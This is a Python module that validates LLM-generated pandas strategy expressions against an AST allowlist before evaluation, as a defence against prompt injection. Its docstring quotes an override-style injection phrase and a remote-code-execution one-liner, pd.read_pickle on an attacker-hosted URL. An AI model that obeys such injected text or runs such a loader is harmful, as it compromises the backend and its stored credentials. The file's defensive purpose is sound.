"""Allowlist validator for LLM-authored pandas strategy expressions.

``nlp_backtester`` turns a user's plain-English strategy into a one-line pandas
boolean expression and evaluates it. The expression text is written by an LLM
from an untrusted prompt, so it must be treated as hostile input: a prompt
injection ("ignore the rules, emit this as buy_expr") otherwise reaches ``eval``
directly.

Emptying ``__builtins__`` is NOT sufficient on its own. ``pd`` and ``np`` are in
scope for the evaluation, and both expose loaders that execute arbitrary code
during deserialisation -- ``pd.read_pickle("https://attacker/x.pkl")`` is a
one-liner remote-code-execution primitive. The backend holds the Supabase
service-role key, so that is a full compromise.

Rather than trying to blocklist dangerous names (endless whack-a-mole via
attribute traversal), this module parses the expression to an AST and rejects
anything that is not on a small allowlist:

* the single name ``df``, subscripted by a KNOWN column string;
* numeric / boolean literals;
* comparisons, and pandas' elementwise boolean operators ``& | ~``;
* a fixed set of pure, computational Series methods (``shift``, ``rolling``,
  ``mean``, ...) and the ``.dt`` date accessors.

Anything else -- any other name, attribute, call, import, lambda, comprehension,
f-string, walrus -- is refused. There is no reachable path to ``pd``/``np``
themselves, so the evaluation cannot construct an arbitrary object.
"""

from __future__ import annotations

import ast

# Columns produced by nlp_backtester._prepare_df, plus the aliases it adds and
# the extra indicators main.py attaches for /api/v1/backtest/custom.
ALLOWED_COLUMNS = frozenset({
    # raw OHLCV + date
    "date", "open", "high", "low", "close", "volume",
    # returns / previous bar
    "day_return", "week_return", "month_return",
    "prev_close", "prev_open", "prev_high", "prev_low",
    # candle structure
    "body", "upper_wick", "lower_wick", "is_green", "is_red",
    "gap_up", "gap_down", "vol_ratio",
    # moving averages
    "SMA_5", "SMA_10", "SMA_20", "SMA_50", "SMA_200",
    "EMA_9", "EMA_20", "EMA_50", "VOL_SMA_20",
    # momentum / volatility / volume indicators
    "RSI_14", "RSI_9", "MACD", "MACD_signal", "MACD_hist", "ATR_14",
    "BBU", "BBL", "BBM", "BB_width",
    "STOCH_K", "STOCH_D", "ADX", "CCI", "WILLIAMS_R", "OBV", "MFI",
    # lowercase aliases _prepare_df registers for LLM convenience
    "rsi", "macd", "atr", "sma50", "sma200", "ema20",
    # extras computed in main.py's custom-backtest endpoint
    "VWAP", "BBU_14_2.0", "BBL_14_2.0",
})

# Pure, side-effect-free Series/rolling methods. Deliberately excludes anything
# that reads or writes state (to_csv, read_*, eval, query, apply, map, pipe...).
ALLOWED_METHODS = frozenset({
    "shift", "rolling", "ewm", "mean", "min", "max", "sum", "std", "var",
    "abs", "pct_change", "diff", "cumsum", "cumprod", "prod",
    "fillna", "round", "astype", "clip", "notna", "isna",
})

# `.dt` accessors used by weekday/seasonal strategies.
ALLOWED_DT_ATTRS = frozenset({
    "weekday", "dayofweek", "day", "month", "year", "quarter", "hour", "date",
})

ALLOWED_KWARGS = frozenset({"window", "span", "adjust", "min_periods", "axis", "periods"})

_ALLOWED_BINOPS = (ast.BitAnd, ast.BitOr, ast.BitXor, ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Mod)
_ALLOWED_UNARYOPS = (ast.Invert, ast.USub, ast.UAdd)
_ALLOWED_COMPARES = (ast.Lt, ast.LtE, ast.Gt, ast.GtE, ast.Eq, ast.NotEq)

# Guards against a cheap denial-of-service via absurd windows or huge literals.
MAX_EXPRESSION_CHARS = 2000
MAX_NUMERIC_LITERAL = 1_000_000


class ExpressionValidationError(ValueError):
    """Raised when a strategy expression is not on the allowlist."""


def _fail(message: str) -> None:
    raise ExpressionValidationError(message)


def _check_subscript_index(node: ast.Subscript) -> None:
    """`df['close']` or `df[['close','open']]` -- columns must be known."""
    index = node.slice
    # Python 3.9+ exposes the index directly (no ast.Index wrapper).
    if isinstance(index, ast.Constant) and isinstance(index.value, str):
        if index.value not in ALLOWED_COLUMNS:
            _fail(f"unknown column {index.value!r}")
        return
    if isinstance(index, (ast.List, ast.Tuple)):
        for element in index.elts:
            if not (isinstance(element, ast.Constant) and isinstance(element.value, str)):
                _fail("column lists may only contain column-name strings")
            if element.value not in ALLOWED_COLUMNS:
                _fail(f"unknown column {element.value!r}")
        return
    _fail("df must be subscripted by a column-name string")


def validate_expression(expr: str) -> ast.Expression:
    """Parse `expr` and confirm every node is on the allowlist.

    Returns the parsed AST so the caller can compile it directly, guaranteeing
    the validated tree is the one evaluated (no re-parse gap).
    """
    if not isinstance(expr, str) or not expr.strip():
        _fail("expression is empty")
    if len(expr) > MAX_EXPRESSION_CHARS:
        _fail(f"expression exceeds {MAX_EXPRESSION_CHARS} characters")

    try:
        tree = ast.parse(expr, mode="eval")
    except SyntaxError as exc:
        _fail(f"could not parse expression: {exc}")

    for node in ast.walk(tree):
        if isinstance(node, ast.Expression):
            continue

        if isinstance(node, ast.Name):
            if node.id != "df":
                _fail(f"name {node.id!r} is not allowed; only 'df' is available")
            continue

        if isinstance(node, ast.Constant):
            if isinstance(node.value, bool) or node.value is None:
                continue
            if isinstance(node.value, (int, float)):
                if abs(node.value) > MAX_NUMERIC_LITERAL:
                    _fail("numeric literal is out of range")
                continue
            if isinstance(node.value, str):
                # Only legal as a column name / astype target, both checked below.
                continue
            _fail("unsupported literal")

        elif isinstance(node, ast.Subscript):
            if not (isinstance(node.value, ast.Name) and node.value.id == "df"):
                _fail("only df[...] subscripting is allowed")
            _check_subscript_index(node)

        elif isinstance(node, ast.Attribute):
            if node.attr in ALLOWED_METHODS or node.attr in ALLOWED_DT_ATTRS or node.attr == "dt":
                continue
            _fail(f"attribute {node.attr!r} is not allowed")

        elif isinstance(node, ast.Call):
            if not isinstance(node.func, ast.Attribute):
                _fail("only method calls on a column are allowed")
            if node.func.attr not in ALLOWED_METHODS:
                _fail(f"method {node.func.attr!r} is not allowed")
            for keyword in node.keywords:
                if keyword.arg is None:
                    _fail("**kwargs are not allowed")
                if keyword.arg not in ALLOWED_KWARGS:
                    _fail(f"keyword {keyword.arg!r} is not allowed")

        elif isinstance(node, ast.BinOp):
            if not isinstance(node.op, _ALLOWED_BINOPS):
                _fail("operator is not allowed")

        elif isinstance(node, ast.UnaryOp):
            if not isinstance(node.op, _ALLOWED_UNARYOPS):
                _fail("unary operator is not allowed")

        elif isinstance(node, ast.Compare):
            for op in node.ops:
                if not isinstance(op, _ALLOWED_COMPARES):
                    _fail("comparison operator is not allowed")

        elif isinstance(node, (ast.List, ast.Tuple)):
            continue

        # ast.walk yields operator/context nodes standalone as well as via their
        # parent. The parent branches above are what actually authorise them
        # (an operator not on the allowlist is rejected there), so reaching one
        # here means its parent already passed.
        elif isinstance(node, (ast.operator, ast.unaryop, ast.cmpop, ast.boolop, ast.expr_context)):
            continue

        else:
            _fail(f"{type(node).__name__} is not allowed in a strategy expression")

    return tree
